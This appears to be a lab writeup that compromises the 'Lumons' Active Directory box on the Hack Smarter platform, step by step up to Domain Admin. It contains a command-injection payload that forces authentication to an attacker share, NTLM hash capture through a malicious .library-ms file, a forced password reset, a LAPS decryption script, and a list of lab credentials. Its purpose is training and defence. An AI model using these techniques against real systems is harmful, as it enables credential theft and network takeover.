---
title: Lumons Hack Smarter - Concise Writeup
slug: lumons_writeup
category: _writeups
share: true
date: 2026-07-02
description: "Medium-rated Active Directory box - foothold to domain compromise on the Hack Smarter platform."
tags:
  - AD
  - Challenge
---
  
  
  
  
## Objective and Scope  
  
Our Client Lumon will soon integrate a high-value employee into the organization. In accordance with internal security protocols, a comprehensive penetration test and internal access verification must be conducted prior to full onboarding.  
  
For the purposes of this evaluation, you will be provided the assigned credentials and access permissions corresponding to the subject employee. Your objective is to assess the scope and boundaries of these permissions, ensuring compliance with all Lumon security standards and operational safeguards.  
  
---  
  
## Initial Creds  
  
```  
hellyr:H3lenaR!2025  
```  
  
---  
  
## Recon Findings  
  
Grabbed the domain name and DC info, added both machines to `/etc/hosts`:  
  
```  
nxc smb 10.1.206.202  
SMB  10.1.206.202  445  DC01  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:lumons.hacksmarter) (signing:True) (SMBv1:None) (Null Auth:True)  
```  
  
Two machines on the network:  
  
**INTRANET — 10.1.200.200**  
  
```  
80/tcp   open  http          Microsoft IIS httpd 10.0  
135/tcp  open  msrpc         Microsoft Windows RPC  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
443/tcp  open  ssl/https?  
445/tcp  open  microsoft-ds?  
3389/tcp open  ms-wbt-server  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
```  
  
**DC01 — 10.1.206.202**  
  
```  
53/tcp   open  domain  
88/tcp   open  kerberos-sec  
135/tcp  open  msrpc  
139/tcp  open  netbios-ssn  
389/tcp  open  ldap  
445/tcp  open  microsoft-ds  
464/tcp  open  kpasswd5  
593/tcp  open  http-rpc-epmap  
636/tcp  open  ldapssl  
3268/tcp open  globalcatLDAP  
3269/tcp open  globalcatLDAPssl  
3389/tcp open  ms-wbt-server  
```  
  
Ran BloodHound and identified the most crucial aspects to this Pentest:  
  
- hellyr is in the **Microdata Refinement** group  
- **HARMONYC** has an active session on the INTRANET box  
- **MARKS** is in both **Microdata Refinement** and **LAPSAdmins**  
- **HELLYE** is a **Domain Admin**  
- The INTRANET box has **LAPS enabled**  
  
Ran `Certipy-ad` as hellyr and found no vulnerable certificate templates from this user.  
  
---  
  
## NTLM Theft — Capturing HARMONYC's Hash  
  
Found the **MDRepo** share on INTRANET is writable by hellyr.   
  
Bloodhound revealed HARMONYc has a session to the intranet machine that holds a writeable SMB share  
![Lumons Hack Smarter - Concise Writeup-1783032054166](../assets/uploads/Lumons%20Hack%20Smarter%20-%20Concise%20Writeup-1783032054166.webp)  
  
  
  
  
After fumbling around with various ort attempts to upload files to steal the hash of a account with an active session.  
  
I found and used CVE-2025-24054/CVE-2025-24071 PoC (https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC) to create a malicious `.library-ms` file that steals NTLM credentials when a user accesses the share.  
  
```  
smbclient //10.1.200.200/MDRepo -U 'lumons.hacksmarter\hellyr' -W lumons.hacksmarter  
Password for [LUMONS.HACKSMARTER\hellyr]:  
Try "help" to get a list of possible commands.  
smb: \> put xd.library-ms  
putting file xd.library-ms as \xd.library-ms (1.1 kB/s) (average 1.1 kB/s)  
smb: \> ls  
  .                                   D        0  Thu Jul  2 04:30:45 2026  
  ..                                DHS        0  Sun Oct 12 12:40:05 2025  
  @grabthehash.scf                    A       90  Thu Jul  2 03:39:51 2026  
  Autorun.inf                         A       81  Thu Jul  2 04:10:39 2026  
  desktop.ini                         A       49  Thu Jul  2 04:10:24 2026  
  Lumons Intranet.url                 A      131  Sun Oct 12 13:57:18 2025  
  Lumons_International.pdf            A   539001  Sun Oct 12 15:01:45 2025  
  stealit.asx                         A      149  Thu Jul  2 04:09:47 2026  
  xd.library-ms                       A      366  Thu Jul  2 04:30:45 2026  
  
                10353659 blocks of size 4096. 3576001 blocks available  
smb: \>  
```  
  
Started Responder:  
  
```  
sudo responder -I <interface>  
  
smbclient //10.1.200.200/MDRepo -U 'lumons.hacksmarter\hellyr' -W lumons.hacksmarter  
smb: \> put xd.library-ms  
```  
  
Caught HARMONYC's NTLMv2 hash:  
![Lumons Hack Smarter - Concise Writeup-1783033310841](../assets/uploads/Lumons%20Hack%20Smarter%20-%20Concise%20Writeup-1783033310841.webp)  
  
Cracked it:  
  
![Lumons Hack Smarter - Concise Writeup-1783031672322](../assets/uploads/Lumons%20Hack%20Smarter%20-%20Concise%20Writeup-1783031672322.webp)  
  
  
  
---  
  
## Web App — Command Injection  
  
Logged into the intranet web portal at `https://intranet.lumons.hacksmarter/login` as harmonyc. Being in the admin group gave access to an admin panel with:  
  
- Viewing files  
- Pinging IPs  
- Unlocking accounts  
  
The **ping function** is vulnerable to command injection.  I used it to coerce the intranetsvc service account into authenticating to our Responder share since it is the account that passes the commands to the host os  
  
Command passed into the ping IP field  
```  
127.0.0.1; Get-ChildItem -Path "\\10.200.68.134\share"  
```  
  
Responder getting the hash!  
![Lumons Hack Smarter - Concise Writeup-1783032233359](../assets/uploads/Lumons%20Hack%20Smarter%20-%20Concise%20Writeup-1783032233359.webp)  
  
 **intranetsvc** NTLMv2 hash. Cracked it to get:  
![Lumons Hack Smarter - Concise Writeup-1783032274002](../assets/uploads/Lumons%20Hack%20Smarter%20-%20Concise%20Writeup-1783032274002.webp)  
  
---  
  
## Password Reset — Owning MarkS  
  
BloodHound showed intranetsvc has **ForceChangePassword** over MarkS. SO using  `net rpc password` to reset MarkS's password:  
  
```  
net rpc password "marks" "P@ssw0rd" -U "lumons.hacksmarter"/"intranetsvc"%"password" -S "dc01.lumons.hacksmarter"  
```  
  
Confirmed from Kali:  
  
```  
nxc smb 10.1.206.202 -u MarkS -p 'P@ssw0rd' -d lumons.hacksmarter  
  
[+] lumons.hacksmarter\MarkS:P@ssw0rd  
```  
  
**New creds I set:** `MarkS:P@ssw0rd`  
  
This allows us to get the user flag!  
![Lumons Hack Smarter - Concise Writeup-1783032331112](../assets/uploads/Lumons%20Hack%20Smarter%20-%20Concise%20Writeup-1783032331112.webp)  
  
  
---  
  
## LAPS — Getting Local Admin on INTRANET  
  
By looking at bloodhound we could see before that mark is part of the LAPS group, this mean he can read the local admin passwords   
  
The `Get-LapsADPassword` cmdlet kept failing from the INTRANET box due to LDAP connectivity issues. I finally figured out to just use  `bloodyAD` from Kali to grab the encrypted LAPS blob:  
  
```  
bloodyAD -d lumons.hacksmarter -u MarkS -p 'P@ssw0rd' --host 10.1.206.202 get search --filter '(cn=INTRANET)' --attr msLAPS-EncryptedPassword  
```  
![Lumons Hack Smarter - Concise Writeup-1783032522469](../assets/uploads/Lumons%20Hack%20Smarter%20-%20Concise%20Writeup-1783032522469.webp)  
  
  
Then decrypted it with `dpapi-ng` from Kali:  
  
```python  
import dpapi_ng  
import base64  
  
blob = base64.b64decode("<encrypted blob>")  
  
plaintext = dpapi_ng.ncrypt_unprotect_secret(  
    blob[16:],  
    server="10.1.206.202",  
    username="MarkS",  
    password="P@ssw0rd",  
    auth_protocol="negotiate"  
)  
print(plaintext.decode("utf-16-le"))  
```  
  
Giving us this beautiful part of the command   
![Lumons Hack Smarter - Concise Writeup-1783032646001](../assets/uploads/Lumons%20Hack%20Smarter%20-%20Concise%20Writeup-1783032646001.webp)  
  
then resulting decrypted password!  
![Lumons Hack Smarter - Concise Writeup-1783032735555](../assets/uploads/Lumons%20Hack%20Smarter%20-%20Concise%20Writeup-1783032735555.webp)  
  
  
  
  
---  
  
## RDP as Local Admin — Dumping Cached Creds  
  
Couldn't use WinRM or impacket tools due to UAC remote restrictions so we had to look toward RDP  
  
With this laps password I was able to achieve a RDP connection to bypass other remote login restrictions like so  
  
```  
xfreerdp3 /v:10.1.200.200 /u:localadmin /p:password /cert-ignore +dynamic-resolution  
```  
  
From an elevated PowerShell prompt, saved the registry hives:  
  
![Lumons Hack Smarter - Concise Writeup-1783032853820](../assets/uploads/Lumons%20Hack%20Smarter%20-%20Concise%20Writeup-1783032853820.webp)  
  
Copied them to the MDRepo share, pulled to Kali, and extracted:  
  
![Lumons Hack Smarter - Concise Writeup-1783033409389](../assets/uploads/Lumons%20Hack%20Smarter%20-%20Concise%20Writeup-1783033409389.webp)  
  
  
Cracked hellye's DCC2 hash:  
  
![Lumons Hack Smarter - Concise Writeup-1783033428133](../assets/uploads/Lumons%20Hack%20Smarter%20-%20Concise%20Writeup-1783033428133.webp)  
  
---  
  
## Domain Admin — Owning DC01  
  
once cracked we head back to our already established RDP session to save time and pivot over to a more elevated PowerShell window using the command  `runas` to spawn a PowerShell window as hellye (Domain Admin):  
  
```powershell  
runas /user:lumons.hacksmarter\hellye powershell  
```  
  
From the new elevated window, remoted into the DC:  
  
![Lumons Hack Smarter - Concise Writeup-1783033529429](../assets/uploads/Lumons%20Hack%20Smarter%20-%20Concise%20Writeup-1783033529429.webp)  
  
and retrieve the root flag!  
  
![Lumons Hack Smarter - Concise Writeup-1783033546515](../assets/uploads/Lumons%20Hack%20Smarter%20-%20Concise%20Writeup-1783033546515.webp)  
  
  
---  
  
## Attack Chain  
  
```  
hellyr (standard user)  
Writable SMB share (MDRepo) → CVE-2025-24054 .library-ms → Captured harmonyc NTLMv2 hash  
→ Cracked hash → Logged into intranet admin portal  
→ Command injection (ping) → Coerced intranetsvc auth → Captured intranetsvc hash  
→ ForceChangePassword → MarkS (LAPSAdmins member)  
→ Encrypted LAPS → dpapi-ng decrypt → localadmin on INTRANET  
→ RDP → Registry hive dump → DCC2 cached creds  
→ Cracked hellye DCC2 hash → runas → PSRemote to DC01 → Domain Admin  
```  
  
  
---  
  
## Creds Collected  
  
|Account|Type|Value|  
|---|---|---|  
|hellyr|Password|H3lenaR!2025|  
|harmonyc|Password|<FILL IN>|  
|intranetsvc|Password|Servicesince1979|  
|MarkS|Password|P@ssw0rd (reset by us)|  
|localadmin|LAPS Password|CureCageTugPartyLineKnee|  
|hellye|Password|<FILL IN>|  
  
---  
  
## Recommendations  
  
**Good:**  
  
- Updated version of LAPS in use (Windows LAPS with encryption)  
  
**Bad:**  
  
- Even when web applications are deployed internally, they should be free from vulnerabilities such as command injection  
- Writable SMB shares accessible to standard domain users allow for NTLM credential theft  
- Cached domain credentials on member servers allowed offline cracking of Domain Admin password  
- Service accounts should not have password reset rights over privileged group members  
- LAPS decryption authorization should be reviewed and limited to only necessary accounts
